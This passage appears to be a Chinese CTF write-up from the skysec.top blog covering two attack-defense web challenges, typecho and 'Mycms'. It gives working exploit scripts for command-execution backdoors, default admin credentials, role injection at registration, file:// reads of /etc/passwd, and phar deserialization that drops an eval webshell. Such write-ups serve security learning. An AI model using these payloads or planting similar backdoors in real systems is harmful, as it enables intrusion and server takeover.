$box[$a]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>最后有一步操作，即将我们输入的密文$string，异或上之前的流密钥，得到明文$result<br>那么如果我们想要已知明文求密文，即用$result异或上流密钥即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$string .= chr(ord($result[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br></pre></td></tr></table></figure></p><p>那我们怎么获取$result呢？还有一步校验要通过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们可以用如下方式生成$result<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$keyb = <span class="string">"9528c27d9961b981415d909a120c6e1b"</span>;</span><br><span class="line">$result = <span class="string">'ls'</span>;</span><br><span class="line">$tmp = substr(md5($result . $keyb), <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">$padding = <span class="string">'0000000000'</span>;</span><br><span class="line">$result = $padding.$tmp.$result;</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure></p><p>最后异或之前的流密钥，再base64encode，即可得到我们的input，达到任意RCE的目的。<br>值得注意的是还有一步<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$keyc = substr($string, <span class="number">0</span>, $ckey_length);</span><br></pre></td></tr></table></figure></p><p>在我们只有明文，没有加密算法的时候，他需要对密文进行截取，这就非常难办了。但是好在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ckey_length = 4;</span><br></pre></td></tr></table></figure></p><p>由于其在base64encode之后，所以我们可以对其进行爆破，数量级为64^4，还是在可爆破的范围内。<br>这样很容易即可进行RCE（这样的题目放在4个小时，2个web的AD下，可能不太好吧= =）</p><h2 id="Web2-Mycms"><a href="#Web2-Mycms" class="headerlink" title="Web2 - Mycms"></a>Web2 - Mycms</h2><p>整体源码如下，我们依次审计<br><img src="/images/2019-04-25-09-56-10.png" alt=""></p><h3 id="漏洞1-预留回调函数"><a href="#漏洞1-预留回调函数" class="headerlink" title="漏洞1 - 预留回调函数"></a>漏洞1 - 预留回调函数</h3><p>/footer.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'SCRIPT_FILENAME'</span>]==<span class="keyword">__FILE__</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;© mycms&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    array_filter(<span class="keyword">array</span>(base64_decode($data[<span class="string">"name"</span>])), base64_decode($data[<span class="string">"pass"</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从代码不难看出<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter(<span class="keyword">array</span>(base64_decode($data[<span class="string">"name"</span>])), base64_decode($data[<span class="string">"pass"</span>]));</span><br></pre></td></tr></table></figure></p><p>该位置存在命令执行，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter(array(&apos;ls /tmp&apos;),&apos;system&apos;);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-04-25-10-00-23.png" alt=""><br>但是如果直接访问footer.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/footer.php</span><br></pre></td></tr></table></figure></p><p>会直接打印<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">© mycms</span><br></pre></td></tr></table></figure></p><p>所以需要找到一个包含点，不难发现index.php有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include &quot;footer.php&quot;;?&gt;</span><br></pre></td></tr></table></figure></p><p>那么只要<code>$data[&quot;name&quot;]</code>和<code>$data[&quot;pass&quot;]</code>可控，即可进行任意命令执行<br>我们跟进两个变量<br>/libs/inc_common.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge($_POST,$_GET);</span><br></pre></td></tr></table></figure></p><p>可以发现，既可以用$_POST也可以用$_GET进行传参<br>所以第一个漏洞利用exp可以写为如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"name"</span>:base64.b64encode(<span class="string">'ls'</span>),</span><br><span class="line"><span class="string">"pass"</span>:base64.b64encode(<span class="string">'system'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(data=data,url=url)</span><br></pre></td></tr></table></figure></p><h2 id="漏洞2-预留登录shell"><a href="#漏洞2-预留登录shell" class="headerlink" title="漏洞2 - 预留登录shell"></a>漏洞2 - 预留登录shell</h2><p>/shell.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'role'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现有一个较为明显的预留shell，但是需要<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'role'</span>] == <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>我们跟进该值：<br>/login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (User::check($user, $pass)) &#123;</span><br><span class="line">        setcookie(<span class="string">"auth"</span>,$user.<span class="string">"\t"</span>.User::encodePassword($pass));</span><br><span class="line">        $_SESSION[<span class="string">'user'</span>] = User::getIDByName($user);</span><br><span class="line">        $_SESSION[<span class="string">'role'</span>] = User::getRoleByName($user);</span><br><span class="line">        $wrong            = <span class="keyword">false</span>;</span><br><span class="line">        header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $wrong = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现如上登录函数，其中有赋值操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'role'</span>] = User::getRoleByName($user);</span><br></pre></td></tr></table></figure></p><p>跟进该函数getRoleByName()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getRoleByName</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $users = User::getAllUser();</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($users); $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($users[$i][<span class="string">'name'</span>] === $name) &#123;</span><br><span class="line">                <span class="keyword">return</span> $users[$i][<span class="string">'role'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>再跟进getAllUser()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllUser</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $sql = <span class="string">'select * from `user`'</span>;</span><br><span class="line">       $db  = <span class="keyword">new</span> MyDB();</span><br><span class="line">       <span class="keyword">if</span> (!$users = $db-&gt;exec_sql($sql)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'password'</span> =&gt; <span class="keyword">self</span>::encodePassword(<span class="string">'admin123'</span>), <span class="string">'role'</span> =&gt; <span class="number">1</span>));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $users;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>可以发现有admin账户信息，容易知道admin账户为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = admin123</span><br></pre></td></tr></table></figure></p><p>那么综合来看，只需使用该账户登录，即可使用shell.php<br>那么可以写出如下exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://localhost/login.php"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'pass'</span>:<span class="string">'admin123'</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'1'</span>:<span class="string">"system('ls');"</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://localhost/shell.php"</span></span><br><span class="line">r = s.post(url,data=data)</span><br></pre></td></tr></table></figure></p><h3 id="漏洞3-管理员覆盖"><a href="#漏洞3-管理员覆盖" class="headerlink" title="漏洞3 - 管理员覆盖"></a>漏洞3 - 管理员覆盖</h3><p>我们注意到注册页面<br>/register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data[<span class="string">"name"</span>] = addslashes($data[<span class="string">'name'</span>]);</span><br><span class="line">$data[<span class="string">"password"</span>] = User::encodePassword($data[<span class="string">'password'</span>]);</span><br><span class="line">$res = User::insertuser($data);</span><br></pre></td></tr></table></figure></p><p>我们跟进insertuser()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertuser</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MyDB();</span><br><span class="line">        $sql = <span class="string">"insert into user("</span>.implode(<span class="string">","</span>,array_keys($data)).<span class="string">") values ('"</span>.implode(<span class="string">"','"</span>,array_values($data)).<span class="string">"')"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$result = $db-&gt;exec_sql($sql)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'数据库异常'</span>, <span class="string">'code'</span> =&gt; <span class="number">-1</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'操作成功'</span>, <span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现关键语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into user("</span>.implode(<span class="string">","</span>,array_keys($data)).<span class="string">") values ('"</span>.implode(<span class="string">"','"</span>,array_values($data)).<span class="string">"')"</span>;</span><br></pre></td></tr></table></figure></p><p>未对$data进行判断，不但未进行查重，也没对数组内容进行check，我们可以顺便传入role，覆盖管理员<br>可写出如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/register.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'name'</span>:<span class="string">'skysky'</span></span><br><span class="line"><span class="string">'password'</span>:<span class="string">'skysky'</span></span><br><span class="line"><span class="string">'role'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url, data=data)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/login.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'skysky'</span>,</span><br><span class="line"><span class="string">'pass'</span>:<span class="string">'skysky'</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'1'</span>:<span class="string">"system('ls');"</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://localhost/shell.php"</span></span><br><span class="line">r = s.post(url,data=data)</span><br></pre></td></tr></table></figure></p><h3 id="漏洞点4-任意文件读取"><a href="#漏洞点4-任意文件读取" class="headerlink" title="漏洞点4 - 任意文件读取"></a>漏洞点4 - 任意文件读取</h3><p>我们看到文件<br>/down.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'filename'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^http/"</span>, $data[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="string">"/var/www/html/static/img/"</span>);    </span><br><span class="line">    <span class="keyword">if</span> (file_exists($data[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">        header(<span class="string">'content-disposition:attachment; filename='</span>.basename($data[<span class="string">'filename'</span>]));</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($data[<span class="string">'filename'</span>]);<span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件不存在"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里对filename参数做了过滤，但过滤非常有限，我们可以用file协议进行任意文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?filename=file:///etc/passwd</span><br></pre></td></tr></table></figure></p><h3 id="漏洞点5-反序列化"><a href="#漏洞点5-反序列化" class="headerlink" title="漏洞点5 - 反序列化"></a>漏洞点5 - 反序列化</h3><p>我们看到文件<br>/libs/class_debug.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $msg=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $log=<span class="string">''</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($msg = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = $msg;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log = <span class="string">'errorlog'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fm = <span class="keyword">new</span> FileManager(<span class="keyword">$this</span>-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $str = <span class="string">"[DEUBG]"</span> . $msg;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fm-&gt;save();</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">'/var/www/html/logs/'</span>.<span class="keyword">$this</span>-&gt;log,<span class="keyword">$this</span>-&gt;msg);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现这里有比较明显任意写文件漏洞，但我们需要控制文件名和文件内容，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;log</span><br><span class="line">$this-&gt;msg</span><br></pre></td></tr></table></figure></p><p>这里的exp构造较为容易<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $msg=<span class="string">'sky.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $log=<span class="string">'&lt;?php @eval($_POST[\'sky\'])'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Debug();</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure></p><p>可以得到我们的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Debug&quot;:2:&#123;s:3:&quot;msg&quot;;s:7:&quot;sky.php&quot;;s:3:&quot;log&quot;;s:26:&quot;&lt;?php @eval($_POST[&apos;sky&apos;])&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>但是我们缺少一个触发序列化的点,这里容易想到phar反序列化。<br>我们全局搜索file_exists()，可以发现/down.php中存在该操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($data[<span class="string">'filename'</span>]))</span><br></pre></td></tr></table></figure></p><p>同时该处没有对伪协议进行过滤，我们可以使用操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=phar:<span class="comment">//......</span></span><br></pre></td></tr></table></figure></p><p>于是我们进一步寻找上传点，我们在/admin.php发现对应上传功能<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($data[<span class="string">'action'</span>] == <span class="string">'send_article'</span>) &#123;</span><br><span class="line">    $res = Article::sendArticle($data);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;html&gt;&lt;script&gt;alert('"</span> . $res[<span class="string">'msg'</span>] . <span class="string">"')&lt;/script&gt;&lt;/html&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='admin.php'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进sendArticle()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$oldname  = $_FILES[<span class="string">'files'</span>][<span class="string">'name'</span>];</span><br><span class="line">$tmp      = $_FILES[<span class="string">'files'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$pathinfo = pathinfo($oldname);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array($pathinfo[<span class="string">'extension'</span>], <span class="keyword">array</span>(<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'文件上传类型出错'</span>, <span class="string">'code'</span> =&gt; <span class="number">-1</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line">$nameid = time() . rand(<span class="number">1000</span>, <span class="number">9999</span>);</span><br><span class="line">$name =  $nameid. <span class="string">'.'</span> . $pathinfo[<span class="string">'extension'</span>];</span><br><span class="line">$filepath = dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/uploads/'</span>;</span><br><span class="line">$file = <span class="string">'uploads/'</span> . $name;</span><br><span class="line"><span class="keyword">if</span> (!move_uploaded_file($tmp, $filepath . $name)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'文件上传出错'</span>, <span class="string">'code'</span> =&gt; <span class="number">-1</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里可以看到几个过滤，首先对后缀名进行了过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;</span><br></pre></td></tr></table></figure></p><p>然后进行了重命名，但这都不重要。我们可以构造图片后缀的phar文件，然后上传，结合file_exists()触发反序列化<br>构造如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $msg=<span class="string">'sky.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $log=<span class="string">'&lt;?php @eval($_POST[\'sky\'])'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(<span class="keyword">new</span> Debug());</span><br><span class="line">$b = unserialize($a);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./skyfuck.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($b);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.jpg'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>上传图片后即可触发反序列化，通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/down.php?filename=phar://uploads/1234.jpg</span><br></pre></td></tr></table></figure></p><p>即可任意写shell</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>听说两个cms一起有是7个洞 = =，先分析一下目前我找到的吧~有空再继续挖掘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上周参加了西湖论剑线下赛，在AD攻防赛中喜迎冠军，以下是AD攻防赛中2道web的题解。&lt;/p&gt;
&lt;h2 id=&quot;Web1-typecho&quot;&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>从PHP底层看open_basedir bypass</title>
    <link href="http://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/"/>
    <id>http://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/</id>
    <published>2019-04-12T02:30:21.000Z</published>
